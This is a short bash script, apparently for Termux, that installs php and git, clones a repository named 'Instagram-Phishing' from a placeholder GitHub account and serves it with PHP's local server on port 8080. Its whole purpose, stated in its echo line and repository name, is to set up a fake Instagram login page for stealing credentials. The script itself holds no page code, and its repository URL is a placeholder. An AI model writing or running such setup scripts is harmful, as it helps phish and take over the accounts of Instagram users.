#!/bin/bash
echo "Installing Instagram Phishing Page..."
pkg install php git -y
git clone https://github.com/YourUsername/Instagram-Phishing
cd Instagram-Phishing
php -S 127.0.0.1:8080
